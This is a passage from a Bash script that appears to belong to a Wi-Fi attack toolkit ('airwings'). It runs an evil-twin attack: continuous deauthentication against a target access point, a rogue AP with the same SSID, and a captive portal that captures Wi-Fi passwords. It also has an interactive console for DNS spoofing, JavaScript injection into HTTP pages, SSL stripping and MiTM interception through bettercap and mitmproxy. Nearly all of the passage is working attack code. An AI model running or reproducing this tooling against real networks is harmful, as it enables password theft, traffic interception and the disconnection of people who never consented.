            if [[ ! "$continue_anyway" =~ ^[Yy]$ ]]; then
                internet_iface=""
                echo -e "${YELLOW}[!] Running captive portal only (no internet)${NC}"
            fi
        else
            echo -e "${GREEN}[✓] Internet source: $internet_iface ($selected_ip)${NC}"
        fi

        # Check if internet interface is WiFi connected to the SAME network being attacked
        if [[ -n "$internet_iface" ]]; then
            local inet_ssid=$(iwconfig "$internet_iface" 2>/dev/null | grep "ESSID:" | sed 's/.*ESSID:"\(.*\)".*/\1/')
            if [[ -n "$inet_ssid" && "$inet_ssid" == "$target_essid" ]]; then
                echo ""
                echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
                echo -e "${RED}║  WARNING: CONFLICT DETECTED                                 ║${NC}"
                echo -e "${RED}╠══════════════════════════════════════════════════════════════╣${NC}"
                echo -e "${RED}║${NC} ${WHITE}$internet_iface is connected to '$inet_ssid'${NC}"
                echo -e "${RED}║${NC} ${WHITE}You are attacking the SAME network!${NC}"
                echo -e "${RED}║${NC}"
                echo -e "${RED}║${NC} ${YELLOW}The deauth will disconnect $internet_iface, killing internet.${NC}"
                echo -e "${RED}║${NC} ${YELLOW}Use a WIRED interface (eth0) or select [0] for no internet.${NC}"
                echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
                echo ""
                read -p "Continue anyway? (y/N): " conflict_confirm
                if [[ ! "$conflict_confirm" =~ ^[Yy]$ ]]; then
                    internet_iface=""
                    echo -e "${YELLOW}[!] Running captive portal only (no internet)${NC}"
                fi
            fi
        fi
    fi

    if [[ -n "$internet_iface" ]]; then
        # Enable IP forwarding
        echo 1 > /proc/sys/net/ipv4/ip_forward
        # Also set via sysctl to ensure it sticks
        sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1

        # Save current iptables state for restoration later
        iptables-save > "$temp_dir/iptables_backup.rules" 2>/dev/null

        # Flush ALL existing NAT and FORWARD rules to start clean
        iptables -t nat -F 2>/dev/null
        iptables -F FORWARD 2>/dev/null

        # Set FORWARD policy to ACCEPT (critical - default DROP blocks all traffic)
        iptables -P FORWARD ACCEPT

        # Set up NAT masquerade
        iptables -t nat -A POSTROUTING -o "$internet_iface" -j MASQUERADE

        # Allow forwarding between AP and internet interfaces
        iptables -A FORWARD -i "$interface" -o "$internet_iface" -j ACCEPT
        iptables -A FORWARD -i "$internet_iface" -o "$interface" -m state --state RELATED,ESTABLISHED -j ACCEPT

        # Redirect HTTP traffic from clients to captive portal (port 80)
        # This ensures captive portal detection works on all devices
        iptables -t nat -A PREROUTING -i "$interface" -p tcp --dport 80 -d 10.0.0.1 -j ACCEPT
        iptables -t nat -A PREROUTING -i "$interface" -p tcp --dport 443 -d 10.0.0.1 -j ACCEPT

        # Verify internet is reachable through the NAT
        if ping -c 1 -W 2 -I "$internet_iface" 8.8.8.8 >/dev/null 2>&1; then
            echo -e "${GREEN}[✓] Internet connectivity verified${NC}"
        else
            echo -e "${YELLOW}[!] Internet may not be reachable on $internet_iface${NC}"
        fi
        echo -e "${CYAN}[*] Victims will have full internet access${NC}"
    else
        echo -e "${YELLOW}[!] No internet interface - running captive portal only${NC}"
    fi
    sleep 1

    echo -e "${YELLOW}[*] Starting deauthentication against target...${NC}"
    aireplay-ng --deauth 0 -a "$target_bssid" "$monitor_interface" &>/dev/null &
    local deauth_pid=$!

    # Start hostapd FIRST - it needs to initialize the interface
    echo -e "${YELLOW}[*] Starting rogue AP...${NC}"
    local hostapd_log="$temp_dir/hostapd.log"
    hostapd "$temp_dir/hostapd.conf" > "$hostapd_log" 2>&1 &
    local ap_pid=$!

    # Wait for hostapd to fully initialize the interface
    sleep 5

    # Verify AP started
    if kill -0 $ap_pid 2>/dev/null; then
        echo -e "${GREEN}[✓] Rogue AP started${NC}"
    else
        echo -e "${RED}[!] AP failed to start${NC}"

        # Show error and try to recover
        if [[ -f "$hostapd_log" ]]; then
            echo -e "${RED}[!] Hostapd log:${NC}"
            tail -5 "$hostapd_log"
        fi

        # Common fix: interface needs to be fully reset
        echo -e "${YELLOW}[*] Attempting recovery...${NC}"
        ip link set "$interface" down 2>/dev/null
        sleep 2
        ip link set "$interface" up 2>/dev/null
        sleep 2

        # Retry hostapd
        hostapd "$temp_dir/hostapd.conf" > "$hostapd_log" 2>&1 &
        ap_pid=$!
        sleep 5

        if kill -0 $ap_pid 2>/dev/null; then
            echo -e "${GREEN}[✓] Rogue AP started on retry${NC}"
        else
            echo -e "${RED}[!] AP failed to start after retry${NC}"
            tail -5 "$hostapd_log" 2>/dev/null
            kill $deauth_pid 2>/dev/null
            pause
            return
        fi
    fi

    # NOW assign IP address AFTER hostapd has initialized
    ip addr flush dev "$interface" 2>/dev/null
    ip addr add 10.0.0.1/24 dev "$interface" 2>/dev/null
    sleep 1

    echo -e "${YELLOW}[*] Starting DNS server...${NC}"
    dnsmasq -C "$temp_dir/dnsmasq.conf" 2>/dev/null &
    local dns_pid=$!
    sleep 2

    # Start Python capture server (replaces lighttpd - handles credential capture)
    echo -e "${YELLOW}[*] Starting capture server...${NC}"
    local cred_log_dir="$LOGS_DIR/credentials"
    mkdir -p "$cred_log_dir"

    PORTAL_DIR="$portal_dir" \
    CRED_LOG_DIR="$cred_log_dir" \
    REDIRECT_URL="https://www.google.com" \
    BIND_ADDR="10.0.0.1" \
    BIND_PORT="80" \
    python3 "$AIRWINGS_DIR/utils/capture_server.py" &
    local web_pid=$!
    sleep 2

    # Verify capture server is running
    if kill -0 $web_pid 2>/dev/null; then
        echo -e "${GREEN}[✓] Capture server running on http://10.0.0.1${NC}"
    else
        echo -e "${RED}[!] Capture server failed to start, falling back to lighttpd${NC}"
        lighttpd -D -f "$temp_dir/lighttpd.conf" 2>/dev/null &
        web_pid=$!
    fi

    echo ""
    echo -e "${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                   EVIL TWIN ACTIVE                       ║${NC}"
    echo -e "${GREEN}╠═══════════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║${NC} ${WHITE}AP SSID:${NC}       $target_essid"
    echo -e "${GREEN}║${NC} ${WHITE}AP Interface:${NC}  $interface"
    echo -e "${GREEN}║${NC} ${WHITE}Internet via:${NC}  ${internet_iface:-NONE (captive only)}"
    echo -e "${GREEN}║${NC} ${WHITE}Portal:${NC}        http://10.0.0.1"
    echo -e "${GREEN}║${NC} ${WHITE}Credentials:${NC}   $cred_log_dir/"
    echo -e "${GREEN}╠═══════════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║${NC} ${CYAN}Device Management:${NC}"
    echo -e "${GREEN}║${NC}   ${WHITE}clients${NC} / ${WHITE}c${NC}          Show connected devices"
    echo -e "${GREEN}║${NC}   ${WHITE}creds${NC}   / ${WHITE}p${NC}          Show captured passwords"
    echo -e "${GREEN}║${NC}   ${WHITE}kick${NC} <MAC>             Disconnect a specific client"
    echo -e "${GREEN}║${NC}   ${WHITE}kickall${NC}                Disconnect all clients"
    echo -e "${GREEN}║${NC}   ${WHITE}deauth${NC}                 Toggle deauth on/off"
    echo -e "${GREEN}╠═══════════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║${NC} ${CYAN}MiTM & Interception:${NC}"
    echo -e "${GREEN}║${NC}   ${WHITE}sniff${NC}                  Start traffic capture (pcap)"
    echo -e "${GREEN}║${NC}   ${WHITE}mitm${NC}                   Start MiTM proxy (bettercap)"
    echo -e "${GREEN}║${NC}   ${WHITE}spoof${NC} <domain> [ip]    DNS spoof a domain"
    echo -e "${GREEN}║${NC}   ${WHITE}inject${NC} <js_url>        Inject JS into HTTP pages"
    echo -e "${GREEN}║${NC}   ${WHITE}sslstrip${NC}               Start SSL stripping"
    echo -e "${GREEN}╠═══════════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║${NC} ${CYAN}System:${NC}"
    echo -e "${GREEN}║${NC}   ${WHITE}status${NC}  / ${WHITE}s${NC}          Show attack status"
    echo -e "${GREEN}║${NC}   ${WHITE}log${NC}                    Show recent DNS/DHCP log"
    echo -e "${GREEN}║${NC}   ${WHITE}bg${NC}                     Background mode (return to menu)"
    echo -e "${GREEN}║${NC}   ${WHITE}stop${NC}    / ${WHITE}q${NC}          Stop attack and exit"
    echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    # Background: monitor hostapd log for client connections (clean output)
    (
        tail -f "$hostapd_log" 2>/dev/null | while read -r line; do
            if [[ "$line" == *"AP-STA-CONNECTED"* ]]; then
                local mac=$(echo "$line" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}')
                echo -e "${GREEN}[+] Client connected: $mac${NC}"
            elif [[ "$line" == *"AP-STA-DISCONNECTED"* ]]; then
                local mac=$(echo "$line" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}')
                echo -e "${YELLOW}[-] Client disconnected: $mac${NC}"
            fi
        done
    ) &
    local monitor_pid=$!

    # Track states for toggleable features
    local deauth_active=true
    local sniff_pid=""
    local mitm_pid=""
    local inject_pid=""
    local sslstrip_pid=""

    # Interactive command loop
    while true; do
        echo ""
        read -p "$(echo -e "${CYAN}airwings>${NC} ")" cmd_input

        # Normalize command to lowercase, extract first word and args
        local cmd=$(echo "$cmd_input" | awk '{print tolower($1)}')
        local cmd_arg=$(echo "$cmd_input" | awk '{print $2}')

        case "$cmd" in
            clients|c)
                echo ""
                echo -e "${WHITE}Connected Clients:${NC}"
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"
                printf "${CYAN}%-4s %-20s %-16s %-10s %s${NC}\n" "#" "MAC Address" "IP Address" "Hostname" "Lease Time"
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"

                local client_count=0

                # Parse DHCP leases from dnsmasq
                if [[ -f "/var/lib/misc/dnsmasq.leases" ]]; then
                    while read -r expire mac ip hostname client_id; do
                        client_count=$((client_count + 1))
                        local remaining=""
                        if [[ "$expire" =~ ^[0-9]+$ ]]; then
                            local now=$(date +%s)
                            local left=$((expire - now))
                            if [[ $left -gt 0 ]]; then
                                remaining="$((left / 3600))h$((left % 3600 / 60))m"
                            else
                                remaining="expired"
                            fi
                        fi
                        [[ "$hostname" == "*" ]] && hostname="-"
                        printf "%-4s %-20s %-16s %-10s %s\n" "[$client_count]" "$mac" "$ip" "$hostname" "$remaining"
                    done < "/var/lib/misc/dnsmasq.leases"
                fi

                # Also check dnsmasq log for DHCPACK entries if no lease file
                if [[ $client_count -eq 0 && -f "$temp_dir/dnsmasq.log" ]]; then
                    grep "DHCPACK" "$temp_dir/dnsmasq.log" 2>/dev/null | while read -r line; do
                        local lease_ip=$(echo "$line" | grep -oE '10\.0\.0\.[0-9]+')
                        local lease_mac=$(echo "$line" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}')
                        if [[ -n "$lease_mac" ]]; then
                            client_count=$((client_count + 1))
                            printf "%-4s %-20s %-16s\n" "[$client_count]" "$lease_mac" "${lease_ip:-unknown}"
                        fi
                    done
                fi

                # Also check hostapd log for connected stations
                if [[ $client_count -eq 0 && -f "$hostapd_log" ]]; then
                    echo -e "${YELLOW}[!] No DHCP leases found. Checking hostapd...${NC}"
                    local connected_macs=$(grep "AP-STA-CONNECTED" "$hostapd_log" 2>/dev/null | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | sort -u)
                    local disconnected_macs=$(grep "AP-STA-DISCONNECTED" "$hostapd_log" 2>/dev/null | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | sort -u)

                    # Show MACs that connected but haven't disconnected
                    while read -r mac; do
                        [[ -z "$mac" ]] && continue
                        local disc_count=$(echo "$disconnected_macs" | grep -c "$mac" 2>/dev/null || true)
                        local conn_count=$(grep -c "AP-STA-CONNECTED.*$mac" "$hostapd_log" 2>/dev/null || true)
                        if [[ $conn_count -gt $disc_count ]]; then
                            client_count=$((client_count + 1))
                            # Try to find IP from ARP table
                            local arp_ip=$(arp -an 2>/dev/null | grep "$mac" | grep -oE '10\.0\.0\.[0-9]+' | head -1)
                            printf "%-4s %-20s %-16s\n" "[$client_count]" "$mac" "${arp_ip:-pending}"
                        fi
                    done <<< "$connected_macs"
                fi

                if [[ $client_count -eq 0 ]]; then
                    echo -e "  ${YELLOW}No clients connected${NC}"
                fi
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"
                echo -e "  ${WHITE}Total: $client_count client(s)${NC}"
                ;;

            creds|p|passwords)
                echo ""
                echo -e "${WHITE}Captured Credentials:${NC}"
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"

                local cred_found=false
                local latest_log=$(ls -t "$cred_log_dir"/wifi_passwords_*.txt 2>/dev/null | head -1)

                if [[ -n "$latest_log" && -f "$latest_log" ]]; then
                    local content=$(cat "$latest_log" 2>/dev/null)
                    if [[ -n "$content" && "$content" != *"="* ]] || [[ -z "$content" ]]; then
                        echo -e "  ${YELLOW}No credentials captured yet${NC}"
                    else
                        echo -e "${GREEN}"
                        cat "$latest_log"
                        echo -e "${NC}"
                        cred_found=true
                    fi
                else
                    echo -e "  ${YELLOW}No credentials captured yet${NC}"
                fi

                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"
                echo -e "  ${WHITE}Log file: ${latest_log:-none}${NC}"
                ;;

            kick)
                if [[ -z "$cmd_arg" ]]; then
                    echo -e "${YELLOW}[!] Usage: kick <MAC address>${NC}"
                    echo -e "${YELLOW}[!] Example: kick d6:19:79:cf:b3:25${NC}"
                    echo -e "${YELLOW}[!] Use 'clients' to see connected MACs${NC}"
                elif [[ "$cmd_arg" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]]; then
                    echo -e "${YELLOW}[*] Kicking client: $cmd_arg${NC}"
                    # Send targeted deauth using the monitor interface
                    aireplay-ng --deauth 5 -a "$target_bssid" -c "$cmd_arg" "$monitor_interface" &>/dev/null &
                    echo -e "${GREEN}[✓] Deauth sent to $cmd_arg (5 frames)${NC}"
                else
                    echo -e "${RED}[!] Invalid MAC address: $cmd_arg${NC}"
                fi
                ;;

            kickall)
                echo -e "${YELLOW}[*] Sending deauth to all connected clients...${NC}"
                aireplay-ng --deauth 5 -a "$target_bssid" "$monitor_interface" &>/dev/null &
                echo -e "${GREEN}[✓] Broadcast deauth sent (5 frames)${NC}"
                ;;

            deauth)
                if [[ "$deauth_active" == true ]]; then
                    # Stop deauth
                    kill $deauth_pid 2>/dev/null
                    deauth_active=false
                    echo -e "${YELLOW}[*] Deauth STOPPED - target clients can reconnect to original AP${NC}"
                else
                    # Restart deauth
                    aireplay-ng --deauth 0 -a "$target_bssid" "$monitor_interface" &>/dev/null &
                    deauth_pid=$!
                    deauth_active=true
                    echo -e "${GREEN}[✓] Deauth STARTED - forcing clients off target AP${NC}"
                fi
                ;;

            status|s)
                echo ""
                echo -e "${WHITE}Attack Status:${NC}"
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"

                # AP status
                if kill -0 $ap_pid 2>/dev/null; then
                    echo -e "  Rogue AP:       ${GREEN}RUNNING${NC} (PID: $ap_pid)"
                else
                    echo -e "  Rogue AP:       ${RED}STOPPED${NC}"
                fi

                # Deauth status
                if [[ "$deauth_active" == true ]] && kill -0 $deauth_pid 2>/dev/null; then
                    echo -e "  Deauth:         ${GREEN}ACTIVE${NC} (PID: $deauth_pid)"
                else
                    echo -e "  Deauth:         ${YELLOW}INACTIVE${NC}"
                    deauth_active=false
                fi

                # DNS status
                if kill -0 $dns_pid 2>/dev/null; then
                    echo -e "  DNS/DHCP:       ${GREEN}RUNNING${NC} (PID: $dns_pid)"
                else
                    echo -e "  DNS/DHCP:       ${RED}STOPPED${NC}"
                fi

                # Web server status
                if kill -0 $web_pid 2>/dev/null; then
                    echo -e "  Capture Server: ${GREEN}RUNNING${NC} (PID: $web_pid)"
                else
                    echo -e "  Capture Server: ${RED}STOPPED${NC}"
                fi

                # Client count
                local active_clients=0
                if [[ -f "/var/lib/misc/dnsmasq.leases" ]]; then
                    active_clients=$(wc -l < "/var/lib/misc/dnsmasq.leases" 2>/dev/null || echo 0)
                fi
                echo -e "  Connected:      ${WHITE}$active_clients client(s)${NC}"

                # Credential count
                local cred_count=0
                local latest_log=$(ls -t "$cred_log_dir"/wifi_passwords_*.txt 2>/dev/null | head -1)
                if [[ -n "$latest_log" ]]; then
                    cred_count=$(grep -c "^Timestamp:" "$latest_log" 2>/dev/null || echo 0)
                fi
                echo -e "  Passwords:      ${WHITE}$cred_count captured${NC}"

                # Internet
                if [[ -n "$internet_iface" ]]; then
                    if ping -c 1 -W 1 8.8.8.8 &>/dev/null; then
                        echo -e "  Internet:       ${GREEN}ONLINE${NC} via $internet_iface"
                    else
                        echo -e "  Internet:       ${RED}OFFLINE${NC} ($internet_iface)"
                    fi
                else
                    echo -e "  Internet:       ${YELLOW}DISABLED${NC} (captive only)"
                fi

                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"
                ;;

            log)
                echo ""
                echo -e "${WHITE}Recent DNS/DHCP Log:${NC}"
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"
                if [[ -f "$temp_dir/dnsmasq.log" ]]; then
                    tail -20 "$temp_dir/dnsmasq.log" 2>/dev/null | while read -r line; do
                        # Highlight important entries
                        if echo "$line" | grep -q "DHCPACK\|DHCPOFFER"; then
                            echo -e "  ${GREEN}$line${NC}"
                        elif echo "$line" | grep -q "query"; then
                            echo -e "  ${GRAY}$line${NC}"
                        else
                            echo -e "  $line"
                        fi
                    done
                else
                    echo -e "  ${YELLOW}No DNS log available${NC}"
                fi
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"
                ;;

            sniff)
                echo ""
                if [[ -n "$sniff_pid" ]] && kill -0 $sniff_pid 2>/dev/null; then
                    echo -e "${YELLOW}[*] Stopping traffic capture...${NC}"
                    kill $sniff_pid 2>/dev/null
                    wait $sniff_pid 2>/dev/null
                    sniff_pid=""
                    echo -e "${GREEN}[✓] Capture stopped. PCAP saved to: $temp_dir/capture.pcap${NC}"
                else
                    local pcap_file="$temp_dir/capture_$(date +%H%M%S).pcap"
                    if command -v tshark &>/dev/null; then
                        echo -e "${YELLOW}[*] Starting traffic capture with tshark...${NC}"
                        tshark -i "$interface" -w "$pcap_file" -q 2>/dev/null &
                        sniff_pid=$!
                    elif command -v tcpdump &>/dev/null; then
                        echo -e "${YELLOW}[*] Starting traffic capture with tcpdump...${NC}"
                        tcpdump -i "$interface" -w "$pcap_file" -q 2>/dev/null &
                        sniff_pid=$!
                    else
                        echo -e "${RED}[!] No capture tool found (install tshark or tcpdump)${NC}"
                        sniff_pid=""
                    fi
                    if [[ -n "$sniff_pid" ]]; then
                        echo -e "${GREEN}[✓] Capturing traffic → $pcap_file${NC}"
                        echo -e "${YELLOW}[*] Type 'sniff' again to stop and save${NC}"
                    fi
                fi
                ;;

            mitm)
                echo ""
                if [[ -n "$mitm_pid" ]] && kill -0 $mitm_pid 2>/dev/null; then
                    echo -e "${YELLOW}[*] Stopping MiTM proxy...${NC}"
                    kill $mitm_pid 2>/dev/null
                    wait $mitm_pid 2>/dev/null
                    # Remove transparent proxy iptables rules
                    iptables -t nat -D PREROUTING -i "$interface" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null
                    iptables -t nat -D PREROUTING -i "$interface" -p tcp --dport 443 -j REDIRECT --to-port 8443 2>/dev/null
                    mitm_pid=""
                    echo -e "${GREEN}[✓] MiTM proxy stopped${NC}"
                else
                    echo -e "${WHITE}MiTM Proxy Options:${NC}"
                    echo -e "${CYAN}[1]${NC} bettercap (full MiTM suite)"
                    echo -e "${CYAN}[2]${NC} mitmproxy (HTTP/HTTPS interception)"
                    echo -e "${CYAN}[3]${NC} Cancel"
                    echo ""
                    read -p "Select: " mitm_choice

                    case $mitm_choice in
                        1)
                            if ! command -v bettercap &>/dev/null; then
                                echo -e "${RED}[!] bettercap not installed${NC}"
                                echo -e "${YELLOW}[*] Install: sudo apt install bettercap${NC}"
                            else
                                echo -e "${YELLOW}[*] Starting bettercap on $interface...${NC}"
                                # Set up transparent proxy redirect
                                iptables -t nat -A PREROUTING -i "$interface" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null
                                iptables -t nat -A PREROUTING -i "$interface" -p tcp --dport 443 -j REDIRECT --to-port 8443 2>/dev/null

                                local caplet_file="$temp_dir/mitm.cap"
                                cat > "$caplet_file" << 'CAPLET'
set http.proxy.sslstrip true
set net.sniff.verbose true
set net.sniff.output /tmp/airwings_mitm_sniff.pcap
http.proxy on
net.sniff on
CAPLET
                                bettercap -iface "$interface" -caplet "$caplet_file" -silent > "$temp_dir/bettercap.log" 2>&1 &
                                mitm_pid=$!
                                sleep 3

                                if kill -0 $mitm_pid 2>/dev/null; then
                                    echo -e "${GREEN}[✓] bettercap MiTM running${NC}"
                                    echo -e "${CYAN}    HTTP proxy: port 8080${NC}"
                                    echo -e "${CYAN}    SSLstrip: enabled${NC}"
                                    echo -e "${CYAN}    Sniffing: active${NC}"
                                    echo -e "${CYAN}    Log: $temp_dir/bettercap.log${NC}"
                                    echo -e "${YELLOW}[*] Type 'mitm' again to stop${NC}"
                                else
                                    echo -e "${RED}[!] bettercap failed to start. Check: $temp_dir/bettercap.log${NC}"
                                    iptables -t nat -D PREROUTING -i "$interface" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null
                                    iptables -t nat -D PREROUTING -i "$interface" -p tcp --dport 443 -j REDIRECT --to-port 8443 2>/dev/null
                                    mitm_pid=""
                                fi
                            fi
                            ;;
                        2)
                            if ! command -v mitmproxy &>/dev/null && ! command -v mitmdump &>/dev/null; then
                                echo -e "${RED}[!] mitmproxy not installed${NC}"
                                echo -e "${YELLOW}[*] Install: sudo apt install mitmproxy${NC}"
                            else
                                echo -e "${YELLOW}[*] Starting mitmproxy transparent proxy...${NC}"
                                iptables -t nat -A PREROUTING -i "$interface" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null
                                iptables -t nat -A PREROUTING -i "$interface" -p tcp --dport 443 -j REDIRECT --to-port 8443 2>/dev/null

                                mitmdump --mode transparent --listen-port 8080 --ssl-insecure \
                                    -w "$temp_dir/mitm_traffic.flow" \
                                    --set block_global=false \
                                    > "$temp_dir/mitmproxy.log" 2>&1 &
                                mitm_pid=$!
                                sleep 3

                                if kill -0 $mitm_pid 2>/dev/null; then
                                    echo -e "${GREEN}[✓] mitmproxy transparent proxy running on port 8080${NC}"
                                    echo -e "${CYAN}    Traffic log: $temp_dir/mitm_traffic.flow${NC}"
                                    echo -e "${CYAN}    Text log: $temp_dir/mitmproxy.log${NC}"
                                    echo -e "${YELLOW}[*] Type 'mitm' again to stop${NC}"
                                else
                                    echo -e "${RED}[!] mitmproxy failed to start${NC}"
                                    iptables -t nat -D PREROUTING -i "$interface" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null
                                    iptables -t nat -D PREROUTING -i "$interface" -p tcp --dport 443 -j REDIRECT --to-port 8443 2>/dev/null
                                    mitm_pid=""
                                fi
                            fi
                            ;;
                        *) ;;
                    esac
                fi
                ;;

            spoof)
                echo ""
                local spoof_domain="$cmd_arg"
                local spoof_ip=$(echo "$cmd_input" | awk '{print $3}')
                [[ -z "$spoof_ip" ]] && spoof_ip="10.0.0.1"

                if [[ -z "$spoof_domain" ]]; then
                    echo -e "${WHITE}DNS Spoof - Redirect domains to custom IP${NC}"
                    echo ""
                    echo -e "${CYAN}Usage:${NC}  spoof <domain> [ip]"
                    echo -e "${CYAN}Examples:${NC}"
                    echo -e "  spoof facebook.com           → redirect to portal (10.0.0.1)"
                    echo -e "  spoof google.com 10.0.0.1    → redirect to custom IP"
                    echo -e "  spoof list                   → show active spoofs"
                    echo -e "  spoof clear                  → remove all custom spoofs"
                elif [[ "$spoof_domain" == "list" ]]; then
                    echo -e "${WHITE}Active DNS Spoofs:${NC}"
                    echo -e "${GRAY}───────────────────────────────────────${NC}"
                    if [[ -f "$temp_dir/custom_spoofs.txt" ]]; then
                        cat "$temp_dir/custom_spoofs.txt" | while read -r line; do
                            echo -e "  ${CYAN}$line${NC}"
                        done
                    else
                        echo -e "  ${YELLOW}No custom spoofs active${NC}"
                    fi
                elif [[ "$spoof_domain" == "clear" ]]; then
                    rm -f "$temp_dir/custom_spoofs.txt"
                    # Rebuild dnsmasq config without custom spoofs and restart
                    echo -e "${YELLOW}[*] Clearing custom DNS spoofs...${NC}"
                    # Kill and restart dnsmasq to reload config
                    kill $dns_pid 2>/dev/null
                    sleep 1
                    # Remove custom entries from dnsmasq conf
                    sed -i '/# CUSTOM SPOOF/d' "$temp_dir/dnsmasq.conf" 2>/dev/null
                    dnsmasq -C "$temp_dir/dnsmasq.conf" 2>/dev/null &
                    dns_pid=$!
                    echo -e "${GREEN}[✓] Custom spoofs cleared, DNS restarted${NC}"
                else
                    echo -e "${YELLOW}[*] Spoofing: $spoof_domain → $spoof_ip${NC}"
                    # Add to dnsmasq config and restart
                    echo "address=/$spoof_domain/$spoof_ip # CUSTOM SPOOF" >> "$temp_dir/dnsmasq.conf"
                    echo "$spoof_domain → $spoof_ip" >> "$temp_dir/custom_spoofs.txt"
                    # Restart dnsmasq to pick up new config
                    kill $dns_pid 2>/dev/null
                    sleep 1
                    dnsmasq -C "$temp_dir/dnsmasq.conf" 2>/dev/null &
                    dns_pid=$!
                    echo -e "${GREEN}[✓] DNS spoof active: $spoof_domain → $spoof_ip${NC}"
                    echo -e "${GRAY}    DNS server restarted with new rules${NC}"
                fi
                ;;

            inject)
                echo ""
                local js_url="$cmd_arg"

                if [[ -z "$js_url" ]]; then
                    echo -e "${WHITE}HTTP JavaScript Injection${NC}"
                    echo -e "${GRAY}Injects a <script> tag into HTTP responses${NC}"
                    echo ""
                    echo -e "${CYAN}Usage:${NC}  inject <js_url_or_code>"
                    echo -e "${CYAN}Examples:${NC}"
                    echo -e "  inject http://10.0.0.1/hook.js   → inject remote JS"
                    echo -e "  inject alert                      → inject alert('pwned')"
                    echo -e "  inject stop                       → stop injection"
                    echo ""
                    echo -e "${YELLOW}[!] Only works on HTTP (not HTTPS) unless SSLstrip is active${NC}"
                else
                    if [[ "$js_url" == "stop" ]]; then
                        if [[ -n "$inject_pid" ]] && kill -0 $inject_pid 2>/dev/null; then
                            kill $inject_pid 2>/dev/null
                            iptables -t nat -D PREROUTING -i "$interface" -p tcp --dport 80 -j REDIRECT --to-port 8888 2>/dev/null
                            inject_pid=""
                            echo -e "${GREEN}[✓] JS injection stopped${NC}"
                        else
                            echo -e "${YELLOW}[!] No injection running${NC}"
                        fi
                    else
                        if ! command -v bettercap &>/dev/null; then
                            echo -e "${RED}[!] bettercap required for JS injection${NC}"
                            echo -e "${YELLOW}[*] Install: sudo apt install bettercap${NC}"
                        else
                            # Build inject script
                            local inject_js=""
                            if [[ "$js_url" == "alert" ]]; then
                                inject_js="alert('Security Audit - Connection Intercepted')"
                            elif [[ "$js_url" == http* ]]; then
                                inject_js="<script src='$js_url'></script>"
                            else
                                inject_js="$js_url"
                            fi

                            local inject_caplet="$temp_dir/inject.cap"
                            cat > "$inject_caplet" << EOF
set http.proxy.script $temp_dir/inject.js
set http.proxy.port 8888
http.proxy on
EOF
                            # Create bettercap inject script
                            cat > "$temp_dir/inject.js" << EOF
function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') != -1) {
        var body = res.ReadBody();
        res.SetBody(body.replace('</head>', '<script>$inject_js</script></head>'));
    }
}
EOF
                            iptables -t nat -A PREROUTING -i "$interface" -p tcp --dport 80 -j REDIRECT --to-port 8888 2>/dev/null

                            bettercap -iface "$interface" -caplet "$inject_caplet" -silent > "$temp_dir/inject.log" 2>&1 &
                            inject_pid=$!
                            sleep 2

                            if kill -0 $inject_pid 2>/dev/null; then
                                echo -e "${GREEN}[✓] JS injection active on HTTP traffic${NC}"
                                echo -e "${YELLOW}[*] Type 'inject stop' to disable${NC}"
                            else
                                echo -e "${RED}[!] Injection failed to start${NC}"
                                iptables -t nat -D PREROUTING -i "$interface" -p tcp --dport 80 -j REDIRECT --to-port 8888 2>/dev/null
                                inject_pid=""
                            fi
                        fi
                    fi
                fi
                ;;

            sslstrip)
                echo ""
                if [[ -n "$sslstrip_pid" ]] && kill -0 $sslstrip_pid 2>/dev/null; then
                    echo -e "${YELLOW}[*] Stopping SSLstrip...${NC}"
                    kill $sslstrip_pid 2>/dev/null
                    iptables -t nat -D PREROUTING -i "$interface" -p tcp --dport 80 -j REDIRECT --to-port 10000 2>/dev/null
                    sslstrip_pid=""
                    echo -e "${GREEN}[✓] SSLstrip stopped${NC}"
                else
                    if command -v bettercap &>/dev/null; then
                        echo -e "${YELLOW}[*] Starting SSLstrip via bettercap...${NC}"
                        local ssl_caplet="$temp_dir/sslstrip.cap"
                        cat > "$ssl_caplet" << 'CAPLET'
set http.proxy.sslstrip true
set http.proxy.port 10000
http.proxy on
CAPLET
                        iptables -t nat -A PREROUTING -i "$interface" -p tcp --dport 80 -j REDIRECT --to-port 10000 2>/dev/null
                        bettercap -iface "$interface" -caplet "$ssl_caplet" -silent > "$temp_dir/sslstrip.log" 2>&1 &
                        sslstrip_pid=$!
                        sleep 3
                        if kill -0 $sslstrip_pid 2>/dev/null; then
                            echo -e "${GREEN}[✓] SSLstrip active - HTTPS downgraded to HTTP${NC}"
                            echo -e "${YELLOW}[!] Only effective on sites without HSTS${NC}"
                            echo -e "${YELLOW}[*] Type 'sslstrip' again to stop${NC}"
                        else
                            echo -e "${RED}[!] SSLstrip failed to start${NC}"
                            iptables -t nat -D PREROUTING -i "$interface" -p tcp --dport 80 -j REDIRECT --to-port 10000 2>/dev/null
                            sslstrip_pid=""
                        fi
